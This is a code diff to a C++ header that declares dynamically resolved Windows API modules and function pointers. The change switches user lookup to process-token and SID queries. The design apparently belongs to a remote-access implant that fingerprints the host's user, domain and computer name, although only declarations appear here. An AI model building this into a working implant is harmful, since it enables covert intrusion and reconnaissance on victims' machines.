@@ -25,10 +25,11 @@ struct LoadedModules
 {
     HMODULE hNtdll;
     HMODULE hKernel32;
+    HMODULE hKernelbase;
     HMODULE hUser32;
     HMODULE hWininet;
     HMODULE hBcrypt;
-    HMODULE hSecur32;
+    HMODULE hAdvapi32;
 };
 
 /* Struct to store pointers to Functions */
@@ -60,8 +61,10 @@ struct LoadedFunctions
     HANDLE (*CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
     BOOL (*SetEvent)(HANDLE hEvent);
     BOOL (*ResetEvent)(HANDLE hEvent);
-    BOOLEAN (*GetUserNameExA)(IN EXTENDED_NAME_FORMAT NameFormat, OUT LPSTR lpNameBuffer, IN OUT PULONG nSize);
     BOOL (*GetComputerNameExA)(IN COMPUTER_NAME_FORMAT NameType, OUT LPSTR lpBuffer, IN OUT LPDWORD nSize);
+    BOOL (*OpenProcessToken)(IN HANDLE ProcessHandle, IN DWORD DesiredAccess, OUT PHANDLE TokenHandle);
+    BOOL (*GetTokenInformation)(IN HANDLE TokenHandle, IN TOKEN_INFORMATION_CLASS TokenInformationClass, OUT LPVOID TokenInformation, IN DWORD TokenInformationLength, OUT PDWORD ReturnLength);
+    BOOL (*LookupAccountSidA)(IN LPCSTR lpSystemName, IN PSID Sid, OUT LPSTR Name, IN LPDWORD cchName, OUT LPSTR ReferencedDomainName, IN OUT LPDWORD cchReferencedDomainName, OUT PSID_NAME_USE peUse);
 };
 
 /* Class for WinAPI functions */
@@ -85,6 +88,7 @@ public:
     LPVOID HeapReAllocCustom(LPVOID lpMem, DWORD dwBytes);
     HANDLE CreateThreadCustom(LPTHREAD_START_ROUTINE pThreadFunc, LPVOID pThreadFuncParams);
     HANDLE CreateMutexCustom();
-    LPVOID GetUserNameCustom();
     LPVOID GetFQDNComputer();
+    HANDLE GetCurrentProcessHandle();
+    void GetUserNameCustom(OUT LPVOID *ppUserName, OUT LPVOID *ppDomainName);
 };
